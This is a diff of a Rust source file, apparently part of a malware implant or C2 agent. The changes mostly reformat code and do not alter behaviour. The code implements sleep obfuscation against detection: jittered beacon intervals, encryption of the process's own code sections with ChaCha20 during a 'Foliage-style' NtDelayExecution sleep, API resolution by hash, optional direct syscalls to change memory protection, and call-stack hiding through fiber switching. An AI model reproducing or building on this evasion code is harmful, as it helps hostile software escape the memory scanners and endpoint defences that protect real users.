@@ -1,5 +1,5 @@
 use anyhow::Result;
-use common::config::{SleepMethod, SleepConfig};
+use common::config::{SleepConfig, SleepMethod};
 use log::debug;
 #[cfg(windows)]
 use log::info;
@@ -7,8 +7,17 @@ use rand::{thread_rng, Rng};
 
 pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
     let mut base = config.base_interval_secs as f64;
-    if let (Some(start), Some(end), Some(mult)) = (config.working_hours_start, config.working_hours_end, config.off_hours_multiplier) {
-        let now = (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() / 3600 % 24) as u32;
+    if let (Some(start), Some(end), Some(mult)) = (
+        config.working_hours_start,
+        config.working_hours_end,
+        config.off_hours_multiplier,
+    ) {
+        let now = (std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_secs()
+            / 3600
+            % 24) as u32;
         if now < start || now >= end {
             base *= mult as f64;
             debug!("Applying off-hours sleep multiplier: {}", mult);
@@ -28,29 +37,35 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
             info!("Initiating Foliage-style sleep for {:?}", duration);
             #[cfg(target_arch = "x86_64")]
             unsafe {
-                use winapi::um::synchapi::WaitForSingleObject;
-                use winapi::shared::ntdef::{NTSTATUS, LARGE_INTEGER};
                 use std::ffi::c_void;
-                
+                use winapi::shared::ntdef::{LARGE_INTEGER, NTSTATUS};
+                use winapi::um::synchapi::WaitForSingleObject;
+
                 // Foliage uses NtDelayExecution
-                
+
                 crypto::encrypt_sections();
                 spoof::spoof_stack();
 
                 let duration_100ns = -(duration.as_nanos() as i64 / 100);
                 let mut delay = duration_100ns;
-                
-                let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
-                let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(ntdll.unwrap_or(0), pe_resolve::hash_str(b"NtDelayExecution\0")).unwrap_or(0);
+
+                let ntdll =
+                    pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
+                let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(
+                    ntdll.unwrap_or(0),
+                    pe_resolve::hash_str(b"NtDelayExecution\0"),
+                )
+                .unwrap_or(0);
                 let addr = nt_delay_execution_addr as *const ();
                 if !addr.is_null() {
-                // Correct NtDelayExecution signature:
-                //   NTSTATUS NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER Interval)
-                // Alertable is a signed 32-bit BOOLEAN (not u8), Interval is *mut i64.
-                let function: extern "system" fn(i32, *mut i64) -> i32 = std::mem::transmute(addr);
-                function(0, &mut delay as *mut i64);
-                spoof::restore_stack();
-                crypto::decrypt_sections();
+                    // Correct NtDelayExecution signature:
+                    //   NTSTATUS NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER Interval)
+                    // Alertable is a signed 32-bit BOOLEAN (not u8), Interval is *mut i64.
+                    let function: extern "system" fn(i32, *mut i64) -> i32 =
+                        std::mem::transmute(addr);
+                    function(0, &mut delay as *mut i64);
+                    spoof::restore_stack();
+                    crypto::decrypt_sections();
                 } // close if !addr.is_null()
             } // close unsafe
             #[cfg(not(target_arch = "x86_64"))]
@@ -66,9 +81,12 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
 }
 
 pub mod crypto {
-    use rand::RngCore;
     #[cfg(windows)]
-    use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
+    use chacha20::{
+        cipher::{KeyIvInit, StreamCipher},
+        ChaCha20,
+    };
+    use rand::RngCore;
 
     thread_local! {
         static SESSION_KEY: std::cell::RefCell<[u8; 32]> = std::cell::RefCell::new([0; 32]);
@@ -84,22 +102,34 @@ pub mod crypto {
     #[cfg(windows)]
     unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> {
         use winapi::um::libloaderapi::GetModuleHandleA;
-        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
-        
+        use winapi::um::winnt::{
+            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
+            IMAGE_SECTION_HEADER,
+        };
+
         let mut sections = Vec::new();
         let base = GetModuleHandleA(std::ptr::null_mut());
-        if base.is_null() { return sections; }
-        
+        if base.is_null() {
+            return sections;
+        }
+
         let dos = base as *const IMAGE_DOS_HEADER;
-        if (*dos).e_magic != IMAGE_DOS_SIGNATURE { return sections; }
-        
+        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
+            return sections;
+        }
+
         let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
-        if (*nt).Signature != IMAGE_NT_SIGNATURE { return sections; }
-        
-        let mut section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
+        if (*nt).Signature != IMAGE_NT_SIGNATURE {
+            return sections;
+        }
+
+        let mut section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
+            as *const IMAGE_SECTION_HEADER;
         for _ in 0..(*nt).FileHeader.NumberOfSections {
             let name = (*section).Name;
-            if name[0..5] == [b'.', b't', b'e', b'x', b't'] || name[0..6] == [b'.', b'r', b'd', b'a', b't', b'a'] {
+            if name[0..5] == [b'.', b't', b'e', b'x', b't']
+                || name[0..6] == [b'.', b'r', b'd', b'a', b't', b'a']
+            {
                 let addr = (base as usize + (*section).VirtualAddress as usize) as *mut u8;
                 let size = *(*section).Misc.VirtualSize() as usize;
                 sections.push((addr, size));
@@ -128,8 +158,12 @@ pub mod crypto {
         let mut sections = Vec::new();
         for line in BufReader::new(f).lines().flatten() {
             // Format: <start>-<end> <perms> <offset> <dev> <inode> [pathname]
-            if !line.contains("r-xp") && !line.contains("r--p") { continue; }
-            if !line.contains(&exe_path) { continue; }
+            if !line.contains("r-xp") && !line.contains("r--p") {
+                continue;
+            }
+            if !line.contains(&exe_path) {
+                continue;
+            }
             let mut fields = line.split_whitespace();
             let addr_range = match fields.next() {
                 Some(r) => r,
@@ -153,7 +187,9 @@ pub mod crypto {
             let end_hex = parts.next().unwrap_or("0");
             let start = usize::from_str_radix(start_hex, 16).unwrap_or(0);
             let end = usize::from_str_radix(end_hex, 16).unwrap_or(0);
-            if start == 0 || end <= start { continue; }
+            if start == 0 || end <= start {
+                continue;
+            }
             sections.push((start as *mut u8, end - start, orig_prot));
         }
         sections
@@ -173,8 +209,12 @@ pub mod crypto {
             rand::thread_rng().fill_bytes(&mut key);
             let mut nonce = [0u8; 12];
             rand::thread_rng().fill_bytes(&mut nonce);
-            SESSION_KEY.with(|k| { *k.borrow_mut() = key; });
-            SESSION_NONCE.with(|n| { *n.borrow_mut() = nonce; });
+            SESSION_KEY.with(|k| {
+                *k.borrow_mut() = key;
+            });
+            SESSION_NONCE.with(|n| {
+                *n.borrow_mut() = nonce;
+            });
             SESSION_INITIALIZED.with(|c| c.set(true));
 
             let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
@@ -188,34 +228,43 @@ pub mod crypto {
                 let mut base_addr = addr as *mut winapi::ctypes::c_void;
 
                 #[cfg(feature = "direct-syscalls")]
-                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
-                    (-1isize) as usize as u64,
-                    &mut base_addr as *mut _ as usize as u64,
-                    &mut size as *mut _ as usize as u64,
-                    winapi::um::winnt::PAGE_READWRITE as u64,
-                    &mut old_protect as *mut _ as usize as u64,
-                ); }
+                {
+                    let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
+                        (-1isize) as usize as u64,
+                        &mut base_addr as *mut _ as usize as u64,
+                        &mut size as *mut _ as usize as u64,
+                        winapi::um::winnt::PAGE_READWRITE as u64,
+                        &mut old_protect as *mut _ as usize as u64,
+                    );
+                }
                 #[cfg(not(feature = "direct-syscalls"))]
-                { winapi::um::memoryapi::VirtualProtect(
-                    base_addr, size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect,
-                ); }
-                
+                {
+                    winapi::um::memoryapi::VirtualProtect(
+                        base_addr,
+                        size,
+                        winapi::um::winnt::PAGE_READWRITE,
+                        &mut old_protect,
+                    );
+                }
+
                 let slice = std::slice::from_raw_parts_mut(addr, size);
                 cipher.apply_keystream(slice);
-                
+
                 let mut temp = 0u32;
                 #[cfg(feature = "direct-syscalls")]
-                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
-                    (-1isize) as usize as u64,
-                    &mut base_addr as *mut _ as usize as u64,
-                    &mut size as *mut _ as usize as u64,
-                    old_protect as u64,
-                    &mut temp as *mut _ as usize as u64,
-                ); }
+                {
+                    let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
+                        (-1isize) as usize as u64,
+                        &mut base_addr as *mut _ as usize as u64,
+                        &mut size as *mut _ as usize as u64,
+                        old_protect as u64,
+                        &mut temp as *mut _ as usize as u64,
+                    );
+                }
                 #[cfg(not(feature = "direct-syscalls"))]
-                { winapi::um::memoryapi::VirtualProtect(
-                    base_addr, size, old_protect, &mut temp,
-                ); }
+                {
+                    winapi::um::memoryapi::VirtualProtect(base_addr, size, old_protect, &mut temp);
+                }
             }
         }
     }
@@ -236,12 +285,16 @@ pub mod crypto {
             }
             SESSION_INITIALIZED.with(|c| c.set(false));
             let mut key = [0u8; 32];
-            SESSION_KEY.with(|k| { key = *k.borrow(); });
+            SESSION_KEY.with(|k| {
+                key = *k.borrow();
+            });
             let mut nonce = [0u8; 12];
-            SESSION_NONCE.with(|n| { nonce = *n.borrow(); });
+            SESSION_NONCE.with(|n| {
+                nonce = *n.borrow();
+            });
 
             let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
-            
+
             std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
             std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);
 
@@ -250,55 +303,78 @@ pub mod crypto {
                 let mut base_addr = addr as *mut winapi::ctypes::c_void;
 
                 #[cfg(feature = "direct-syscalls")]
-                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
-                    (-1isize) as usize as u64,
-                    &mut base_addr as *mut _ as usize as u64,
-                    &mut size as *mut _ as usize as u64,
-                    winapi::um::winnt::PAGE_READWRITE as u64,
-                    &mut old_protect as *mut _ as usize as u64,
-                ); }
+                {
+                    let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
+                        (-1isize) as usize as u64,
+                        &mut base_addr as *mut _ as usize as u64,
+                        &mut size as *mut _ as usize as u64,
+                        winapi::um::winnt::PAGE_READWRITE as u64,
+                        &mut old_protect as *mut _ as usize as u64,
+                    );
+                }
                 #[cfg(not(feature = "direct-syscalls"))]
-                { winapi::um::memoryapi::VirtualProtect(
-                    base_addr, size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect,
-                ); }
+                {
+                    winapi::um::memoryapi::VirtualProtect(
+                        base_addr,
+                        size,
+                        winapi::um::winnt::PAGE_READWRITE,
+                        &mut old_protect,
+                    );
+                }
 
                 let slice = std::slice::from_raw_parts_mut(addr, size);
                 cipher.apply_keystream(slice);
-                
+
                 let mut temp = 0u32;
                 #[cfg(feature = "direct-syscalls")]
-                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
-                    (-1isize) as usize as u64,
-                    &mut base_addr as *mut _ as usize as u64,
-                    &mut size as *mut _ as usize as u64,
-                    old_protect as u64,
-                    &mut temp as *mut _ as usize as u64,
-                ); }
+                {
+                    let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
+                        (-1isize) as usize as u64,
+                        &mut base_addr as *mut _ as usize as u64,
+                        &mut size as *mut _ as usize as u64,
+                        old_protect as u64,
+                        &mut temp as *mut _ as usize as u64,
+                    );
+                }
                 #[cfg(not(feature = "direct-syscalls"))]
-                { winapi::um::memoryapi::VirtualProtect(base_addr, size, old_protect, &mut temp); }
+                {
+                    winapi::um::memoryapi::VirtualProtect(base_addr, size, old_protect, &mut temp);
+                }
             }
         }
     }
 
     #[cfg(not(windows))]
     pub fn encrypt_sections() {
-        use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
+        use chacha20::{
+            cipher::{KeyIvInit, StreamCipher},
+            ChaCha20,
+        };
         unsafe {
             let mut key = [0u8; 32];
             rand::thread_rng().fill_bytes(&mut key);
-            SESSION_KEY.with(|k| { *k.borrow_mut() = key; });
+            SESSION_KEY.with(|k| {
+                *k.borrow_mut() = key;
+            });
             SESSION_INITIALIZED.with(|c| c.set(true));
             let mut nonce = [0u8; 12];
             rand::thread_rng().fill_bytes(&mut nonce);
-            SESSION_NONCE.with(|n| { *n.borrow_mut() = nonce; });
+            SESSION_NONCE.with(|n| {
+                *n.borrow_mut() = nonce;
+            });
             let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
             std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
             std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);
             let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
             for (addr, size, _orig_prot) in get_code_sections() {
                 let aligned = (addr as usize) & !(page_size - 1);
-                let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
-                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_WRITE);
+                let aligned_size =
+                    ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
+                libc::mprotect(
+                    aligned as *mut libc::c_void,
+                    aligned_size,
+                    libc::PROT_READ | libc::PROT_WRITE,
+                );
                 let slice = std::slice::from_raw_parts_mut(addr, size);
                 cipher.apply_keystream(slice);
                 // Encrypted: keep PROT_READ during sleep so signal handlers can
@@ -311,7 +387,10 @@ pub mod crypto {
 
     #[cfg(not(windows))]
     pub fn decrypt_sections() {
-        use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
+        use chacha20::{
+            cipher::{KeyIvInit, StreamCipher},
+            ChaCha20,
+        };
         unsafe {
             if !SESSION_INITIALIZED.with(|c| c.get()) {
                 log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
@@ -319,17 +398,26 @@ pub mod crypto {
             }
             SESSION_INITIALIZED.with(|c| c.set(false));
             let mut key = [0u8; 32];
-            SESSION_KEY.with(|k| { key = *k.borrow(); });
+            SESSION_KEY.with(|k| {
+                key = *k.borrow();
+            });
             let mut nonce = [0u8; 12];
-            SESSION_NONCE.with(|n| { nonce = *n.borrow(); });
+            SESSION_NONCE.with(|n| {
+                nonce = *n.borrow();
+            });
             let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
             std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
             std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);
             let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
             for (addr, size, orig_prot) in get_code_sections() {
                 let aligned = (addr as usize) & !(page_size - 1);
-                let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
-                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_WRITE);
+                let aligned_size =
+                    ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
+                libc::mprotect(
+                    aligned as *mut libc::c_void,
+                    aligned_size,
+                    libc::PROT_READ | libc::PROT_WRITE,
+                );
                 let slice = std::slice::from_raw_parts_mut(addr, size);
                 cipher.apply_keystream(slice);
                 // Restore the original protection — PROT_READ|PROT_EXEC for .text,
@@ -355,7 +443,9 @@ pub mod spoof {
         // Convert the current thread to a fiber so we can switch away from it.
         // This hides the current call stack during the sleep window.
         unsafe {
-            use winapi::um::winbase::{ConvertThreadToFiber, CreateFiber, SwitchToFiber, DeleteFiber};
+            use winapi::um::winbase::{
+                ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
+            };
 
             // Only convert once per thread
             let main_fiber = MAIN_FIBER.with(|f| f.get());
